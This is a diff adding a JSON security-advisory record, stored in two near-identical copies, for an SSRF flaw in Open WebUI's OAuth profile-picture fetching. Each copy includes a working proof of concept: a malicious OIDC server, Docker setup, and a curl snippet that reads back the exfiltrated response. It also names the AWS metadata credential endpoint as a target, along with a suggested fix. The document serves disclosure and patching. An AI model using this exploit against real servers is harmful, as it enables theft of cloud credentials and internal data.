@@ -1,0 +1,99 @@
+{
+  "global": {
+    "cve_id": "CVE-2026-45338",
+    "cvss_severities": {
+      "cvss_v3": {
+        "score": 7.7,
+        "vector_string": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:N/A:N"
+      },
+      "cvss_v4": {
+        "score": 0,
+        "vector_string": null
+      }
+    },
+    "cwe_ids": [
+      "CWE-918"
+    ],
+    "description": "## Summary\n\nA Server-Side Request Forgery (SSRF) vulnerability exists in `_process_picture_url()` in `backend/open_webui/utils/oauth.py` (line ~1338). The function fetches arbitrary URLs from OAuth `picture` claims without applying `validate_url()`, allowing an attacker to force the server to make HTTP requests to internal resources and exfiltrate the full response.\n\n## Vulnerable Code\n```python\n# backend/open_webui/utils/oauth.py, line ~1337-1345\nasync def _process_picture_url(self, picture_url: str, access_token: str = None) -> str:\n    # No validate_url() call here\n    async with aiohttp.ClientSession(trust_env=True) as session:\n        async with session.get(picture_url, **get_kwargs, ssl=AIOHTTP_CLIENT_SESSION_SSL) as resp:\n            if resp.ok:\n                picture = await resp.read()\n                base64_encoded_picture = base64.b64encode(picture).decode('utf-8')\n                return f'data:{guessed_mime_type};base64,{base64_encoded_picture}'\n```\n\nThe codebase already uses `validate_url()` for the same SSRF protection pattern in other paths:\n- `backend/open_webui/utils/files.py:38` - `validate_url(url)` before `requests.get(url)`\n- `backend/open_webui/routers/images.py:800` - `validate_url(data)` before `requests.get(data)`\n\nThe omission in `_process_picture_url()` is inconsistent with the project's own security practices.\n\n## Affected Code Paths\n\n1. **New user OAuth signup** (line ~1556): `picture_url = await self._process_picture_url(picture_url, token.get('access_token'))`\n2. **Existing user picture update on login** (line ~1536): when `OAUTH_UPDATE_PICTURE_ON_LOGIN=true`\n\n## Steps to Reproduce\n\n### Prerequisites\n- Open WebUI instance with generic OIDC OAuth configured\n- `ENABLE_OAUTH_SIGNUP=true`\n\n### Setup\n\n**1. Start a minimal OIDC server** that returns a malicious `picture` claim pointing to an internal canary endpoint:\n```python\n\"\"\"Minimal OIDC PoC server - save as poc_oidc.py\"\"\"\nfrom http.server import HTTPServer, BaseHTTPRequestHandler\nimport json, urllib.parse\n\nSSRF_TARGET = \"http://host.docker.internal:9000/canary\"\nCANARY = \"SSRF_CONFIRMED_OPEN_WEBUI\"\n\nclass Handler(BaseHTTPRequestHandler):\n    def do_GET(self):\n        path = urllib.parse.urlparse(self.path).path\n        query = urllib.parse.parse_qs(urllib.parse.urlparse(self.path).query)\n        if path == \"/.well-known/openid-configuration\":\n            self._json({\"issuer\":\"http://host.docker.internal:9000\",\n                \"authorization_endpoint\":\"http://localhost:9000/authorize\",\n                \"token_endpoint\":\"http://host.docker.internal:9000/token\",\n                \"userinfo_endpoint\":\"http://host.docker.internal:9000/userinfo\",\n                \"jwks_uri\":\"http://host.docker.internal:9000/jwks\",\n                \"response_types_supported\":[\"code\"],\"subject_types_supported\":[\"public\"],\n                \"id_token_signing_alg_values_supported\":[\"RS256\"],\n                \"token_endpoint_auth_methods_supported\":[\"client_secret_post\",\"client_secret_basic\"]})\n        elif path == \"/authorize\":\n            ru = query.get(\"redirect_uri\",[\"\"])[0]\n            st = query.get(\"state\",[\"\"])[0]\n            self.send_response(302)\n            self.send_header(\"Location\", f\"{ru}?code=poc-code&state={st}\")\n            self.end_headers()\n        elif path == \"/userinfo\":\n            self._json({\"sub\":\"attacker\",\"email\":\"attacker@example.com\",\"name\":\"Attacker\",\"picture\":SSRF_TARGET})\n        elif path == \"/jwks\":\n            self._json({\"keys\":[]})\n        elif path == \"/canary\":\n            self.send_response(200)\n            self.send_header(\"Content-Type\",\"text/plain\")\n            body = CANARY.encode()\n            self.send_header(\"Content-Length\",len(body))\n            self.end_headers()\n            self.wfile.write(body)\n            print(f\"!!! CANARY FETCHED - SSRF CONFIRMED !!!\")\n        else:\n            self.send_response(404); self.end_headers()\n    def do_POST(self):\n        if \"/token\" in self.path:\n            self._json({\"access_token\":\"tok\",\"token_type\":\"bearer\",\"expires_in\":3600,\n                \"userinfo\":{\"sub\":\"attacker\",\"email\":\"attacker@example.com\",\"name\":\"Attacker\",\"picture\":SSRF_TARGET}})\n    def _json(self, d):\n        b = json.dumps(d).encode()\n        self.send_response(200)\n        self.send_header(\"Content-Type\",\"application/json\")\n        self.send_header(\"Content-Length\",len(b))\n        self.end_headers()\n        self.wfile.write(b)\n\nHTTPServer((\"0.0.0.0\", 9000), Handler).serve_forever()\n```\n\n**2. Run the PoC server:**\n```bash\npython3 poc_oidc.py\n```\n\n**3. Start Open WebUI with Docker:**\n```bash\ndocker run -d -p 3000:8080 \\\n  --name owui-ssrf-test \\\n  --add-host=host.docker.internal:host-gateway \\\n  -e ENABLE_OAUTH_SIGNUP=true \\\n  -e WEBUI_AUTH=true \\\n  -e OAUTH_CLIENT_ID=test-client \\\n  -e OAUTH_CLIENT_SECRET=test-secret \\\n  -e OPENID_PROVIDER_URL=http://host.docker.internal:9000/.well-known/openid-configuration \\\n  -e OAUTH_PROVIDER_NAME=TestOIDC \\\n  -e \"OAUTH_SCOPES=openid email profile\" \\\n  ghcr.io/open-webui/open-webui:main\n```\n\n**4. Create an admin account** at `http://localhost:3000`, then sign out.\n\n**5. Click \"Continue with TestOIDC\"** on the login page.\n\n**6. Observe the PoC server terminal** - it prints `!!! CANARY FETCHED - SSRF CONFIRMED !!!`\n\n**7. Verify exfiltrated data is stored and readable:**\n```bash\ncurl -s http://localhost:3000/api/v1/auths/ \\\n  -H \"Authorization: Bearer <session-token>\" | python3 -c \"\nimport sys, json, base64\ndata = json.load(sys.stdin)\nurl = data.get('profile_image_url', '')\nif 'base64,' in url:\n    decoded = base64.b64decode(url.split('base64,',1)[1]).decode()\n    print(f'DECODED: {decoded}')\n\"\n```\n\n**Result:** `DECODED: SSRF_CONFIRMED_OPEN_WEBUI`\n\nThe server fetched the attacker-controlled URL, base64-encoded the response, stored it as `profile_image_url`, and the attacker can read it back via the API.\n\n## Impact\n\nAn attacker can force the Open WebUI server to make HTTP requests to:\n\n- **Cloud metadata endpoints** (AWS IMDSv1 at `http://169.254.169.254/latest/meta-data/iam/security-credentials/`) to steal IAM credentials\n- **Internal network services** not exposed to the internet\n- **Localhost-bound services** (Redis, Elasticsearch, internal APIs)\n\nThis is a **full-read SSRF**: the complete HTTP response body is exfiltrated to the attacker via the base64-encoded `profile_image_url` field.\n\n## Configuration Note\n\nThis vulnerability requires `ENABLE_OAUTH_SIGNUP=true` (for the new-user path) or `OAUTH_UPDATE_PICTURE_ON_LOGIN=true` (for the existing-user path). While these are not default settings, they are standard in production deployments that use OAuth for user management, which is the primary use case for configuring OAuth at all.\n\n## Suggested Fix\n\nApply `validate_url()` before fetching, consistent with existing patterns in the codebase:\n```python\nfrom open_webui.retrieval.web.utils import validate_url\n\nasync def _process_picture_url(self, picture_url: str, access_token: str = None) -> str:\n    if not picture_url:\n        return '/user.png'\n    try:\n        validate_url(picture_url)  # Add this line\n        # ... rest unchanged\n```",
+    "ghsa_id": "GHSA-24c9-2m8q-qhmh",
+    "html_url": "https://github.com/advisories/GHSA-24c9-2m8q-qhmh",
+    "identifiers": [
+      {
+        "type": "GHSA",
+        "value": "GHSA-24c9-2m8q-qhmh"
+      },
+      {
+        "type": "CVE",
+        "value": "CVE-2026-45338"
+      }
+    ],
+    "published_at": "2026-05-14T20:19:56Z",
+    "references": [
+      "https://github.com/open-webui/open-webui/security/advisories/GHSA-24c9-2m8q-qhmh",
+      "https://github.com/open-webui/open-webui/releases/tag/v0.9.0",
+      "https://nvd.nist.gov/vuln/detail/CVE-2026-45338",
+      "https://github.com/advisories/GHSA-24c9-2m8q-qhmh"
+    ],
+    "severity": "high",
+    "summary": "Open WebUI Vulnerable to SSRF via OAuth Profile Picture URL in _process_picture_url (oauth.py)",
+    "updated_at": "2026-05-19T15:59:14Z",
+    "vulnerabilities": [
+      {
+        "first_patched_version": "0.9.0",
+        "package": {
+          "ecosystem": "pip",
+          "name": "open-webui"
+        },
+        "vulnerable_version_range": "<= 0.8.12"
+      }
+    ],
+    "withdrawn_at": null
+  },
+  "id": "GHSA-24c9-2m8q-qhmh",
+  "repo": {
+    "cve_id": "CVE-2026-45338",
+    "cvss_severities": {
+      "cvss_v3": {
+        "score": 7.7,
+        "vector_string": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:N/A:N"
+      },
+      "cvss_v4": {
+        "score": null,
+        "vector_string": null
+      }
+    },
+    "cwe_ids": [
+      "CWE-918"
+    ],
+    "description": "## Summary\r\n\r\nA Server-Side Request Forgery (SSRF) vulnerability exists in `_process_picture_url()` in `backend/open_webui/utils/oauth.py` (line ~1338). The function fetches arbitrary URLs from OAuth `picture` claims without applying `validate_url()`, allowing an attacker to force the server to make HTTP requests to internal resources and exfiltrate the full response.\r\n\r\n## Vulnerable Code\r\n```python\r\n# backend/open_webui/utils/oauth.py, line ~1337-1345\r\nasync def _process_picture_url(self, picture_url: str, access_token: str = None) -> str:\r\n    # No validate_url() call here\r\n    async with aiohttp.ClientSession(trust_env=True) as session:\r\n        async with session.get(picture_url, **get_kwargs, ssl=AIOHTTP_CLIENT_SESSION_SSL) as resp:\r\n            if resp.ok:\r\n                picture = await resp.read()\r\n                base64_encoded_picture = base64.b64encode(picture).decode('utf-8')\r\n                return f'data:{guessed_mime_type};base64,{base64_encoded_picture}'\r\n```\r\n\r\nThe codebase already uses `validate_url()` for the same SSRF protection pattern in other paths:\r\n- `backend/open_webui/utils/files.py:38` - `validate_url(url)` before `requests.get(url)`\r\n- `backend/open_webui/routers/images.py:800` - `validate_url(data)` before `requests.get(data)`\r\n\r\nThe omission in `_process_picture_url()` is inconsistent with the project's own security practices.\r\n\r\n## Affected Code Paths\r\n\r\n1. **New user OAuth signup** (line ~1556): `picture_url = await self._process_picture_url(picture_url, token.get('access_token'))`\r\n2. **Existing user picture update on login** (line ~1536): when `OAUTH_UPDATE_PICTURE_ON_LOGIN=true`\r\n\r\n## Steps to Reproduce\r\n\r\n### Prerequisites\r\n- Open WebUI instance with generic OIDC OAuth configured\r\n- `ENABLE_OAUTH_SIGNUP=true`\r\n\r\n### Setup\r\n\r\n**1. Start a minimal OIDC server** that returns a malicious `picture` claim pointing to an internal canary endpoint:\r\n```python\r\n\"\"\"Minimal OIDC PoC server - save as poc_oidc.py\"\"\"\r\nfrom http.server import HTTPServer, BaseHTTPRequestHandler\r\nimport json, urllib.parse\r\n\r\nSSRF_TARGET = \"http://host.docker.internal:9000/canary\"\r\nCANARY = \"SSRF_CONFIRMED_OPEN_WEBUI\"\r\n\r\nclass Handler(BaseHTTPRequestHandler):\r\n    def do_GET(self):\r\n        path = urllib.parse.urlparse(self.path).path\r\n        query = urllib.parse.parse_qs(urllib.parse.urlparse(self.path).query)\r\n        if path == \"/.well-known/openid-configuration\":\r\n            self._json({\"issuer\":\"http://host.docker.internal:9000\",\r\n                \"authorization_endpoint\":\"http://localhost:9000/authorize\",\r\n                \"token_endpoint\":\"http://host.docker.internal:9000/token\",\r\n                \"userinfo_endpoint\":\"http://host.docker.internal:9000/userinfo\",\r\n                \"jwks_uri\":\"http://host.docker.internal:9000/jwks\",\r\n                \"response_types_supported\":[\"code\"],\"subject_types_supported\":[\"public\"],\r\n                \"id_token_signing_alg_values_supported\":[\"RS256\"],\r\n                \"token_endpoint_auth_methods_supported\":[\"client_secret_post\",\"client_secret_basic\"]})\r\n        elif path == \"/authorize\":\r\n            ru = query.get(\"redirect_uri\",[\"\"])[0]\r\n            st = query.get(\"state\",[\"\"])[0]\r\n            self.send_response(302)\r\n            self.send_header(\"Location\", f\"{ru}?code=poc-code&state={st}\")\r\n            self.end_headers()\r\n        elif path == \"/userinfo\":\r\n            self._json({\"sub\":\"attacker\",\"email\":\"attacker@example.com\",\"name\":\"Attacker\",\"picture\":SSRF_TARGET})\r\n        elif path == \"/jwks\":\r\n            self._json({\"keys\":[]})\r\n        elif path == \"/canary\":\r\n            self.send_response(200)\r\n            self.send_header(\"Content-Type\",\"text/plain\")\r\n            body = CANARY.encode()\r\n            self.send_header(\"Content-Length\",len(body))\r\n            self.end_headers()\r\n            self.wfile.write(body)\r\n            print(f\"!!! CANARY FETCHED - SSRF CONFIRMED !!!\")\r\n        else:\r\n            self.send_response(404); self.end_headers()\r\n    def do_POST(self):\r\n        if \"/token\" in self.path:\r\n            self._json({\"access_token\":\"tok\",\"token_type\":\"bearer\",\"expires_in\":3600,\r\n                \"userinfo\":{\"sub\":\"attacker\",\"email\":\"attacker@example.com\",\"name\":\"Attacker\",\"picture\":SSRF_TARGET}})\r\n    def _json(self, d):\r\n        b = json.dumps(d).encode()\r\n        self.send_response(200)\r\n        self.send_header(\"Content-Type\",\"application/json\")\r\n        self.send_header(\"Content-Length\",len(b))\r\n        self.end_headers()\r\n        self.wfile.write(b)\r\n\r\nHTTPServer((\"0.0.0.0\", 9000), Handler).serve_forever()\r\n```\r\n\r\n**2. Run the PoC server:**\r\n```bash\r\npython3 poc_oidc.py\r\n```\r\n\r\n**3. Start Open WebUI with Docker:**\r\n```bash\r\ndocker run -d -p 3000:8080 \\\r\n  --name owui-ssrf-test \\\r\n  --add-host=host.docker.internal:host-gateway \\\r\n  -e ENABLE_OAUTH_SIGNUP=true \\\r\n  -e WEBUI_AUTH=true \\\r\n  -e OAUTH_CLIENT_ID=test-client \\\r\n  -e OAUTH_CLIENT_SECRET=test-secret \\\r\n  -e OPENID_PROVIDER_URL=http://host.docker.internal:9000/.well-known/openid-configuration \\\r\n  -e OAUTH_PROVIDER_NAME=TestOIDC \\\r\n  -e \"OAUTH_SCOPES=openid email profile\" \\\r\n  ghcr.io/open-webui/open-webui:main\r\n```\r\n\r\n**4. Create an admin account** at `http://localhost:3000`, then sign out.\r\n\r\n**5. Click \"Continue with TestOIDC\"** on the login page.\r\n\r\n**6. Observe the PoC server terminal** - it prints `!!! CANARY FETCHED - SSRF CONFIRMED !!!`\r\n\r\n**7. Verify exfiltrated data is stored and readable:**\r\n```bash\r\ncurl -s http://localhost:3000/api/v1/auths/ \\\r\n  -H \"Authorization: Bearer <session-token>\" | python3 -c \"\r\nimport sys, json, base64\r\ndata = json.load(sys.stdin)\r\nurl = data.get('profile_image_url', '')\r\nif 'base64,' in url:\r\n    decoded = base64.b64decode(url.split('base64,',1)[1]).decode()\r\n    print(f'DECODED: {decoded}')\r\n\"\r\n```\r\n\r\n**Result:** `DECODED: SSRF_CONFIRMED_OPEN_WEBUI`\r\n\r\nThe server fetched the attacker-controlled URL, base64-encoded the response, stored it as `profile_image_url`, and the attacker can read it back via the API.\r\n\r\n## Impact\r\n\r\nAn attacker can force the Open WebUI server to make HTTP requests to:\r\n\r\n- **Cloud metadata endpoints** (AWS IMDSv1 at `http://169.254.169.254/latest/meta-data/iam/security-credentials/`) to steal IAM credentials\r\n- **Internal network services** not exposed to the internet\r\n- **Localhost-bound services** (Redis, Elasticsearch, internal APIs)\r\n\r\nThis is a **full-read SSRF**: the complete HTTP response body is exfiltrated to the attacker via the base64-encoded `profile_image_url` field.\r\n\r\n## Configuration Note\r\n\r\nThis vulnerability requires `ENABLE_OAUTH_SIGNUP=true` (for the new-user path) or `OAUTH_UPDATE_PICTURE_ON_LOGIN=true` (for the existing-user path). While these are not default settings, they are standard in production deployments that use OAuth for user management, which is the primary use case for configuring OAuth at all.\r\n\r\n## Suggested Fix\r\n\r\nApply `validate_url()` before fetching, consistent with existing patterns in the codebase:\r\n```python\r\nfrom open_webui.retrieval.web.utils import validate_url\r\n\r\nasync def _process_picture_url(self, picture_url: str, access_token: str = None) -> str:\r\n    if not picture_url:\r\n        return '/user.png'\r\n    try:\r\n        validate_url(picture_url)  # Add this line\r\n        # ... rest unchanged\r\n```",
+    "ghsa_id": "GHSA-24c9-2m8q-qhmh",
+    "html_url": "https://github.com/open-webui/open-webui/security/advisories/GHSA-24c9-2m8q-qhmh",
+    "identifiers": [
+      {
+        "type": "GHSA",
+        "value": "GHSA-24c9-2m8q-qhmh"
+      },
+      {
+        "type": "CVE",
+        "value": "CVE-2026-45338"
+      }
+    ],
+    "published_at": "2026-05-09T19:11:52Z",
+    "references": [],
+    "severity": "high",
+    "summary": "SSRF via OAuth Profile Picture URL in _process_picture_url (oauth.py)",
+    "updated_at": "2026-05-12T01:19:42Z",
+    "vulnerabilities": [
+      {
+        "package": {
+          "ecosystem": "pip",
+          "name": "open-webui"
+        },
+        "patched_versions": ">= 0.9.0",
+        "vulnerable_version_range": "<= 0.8.12"
+      }
+    ],
+    "withdrawn_at": null
+  },
+  "repository": "open-webui/open-webui"
+}
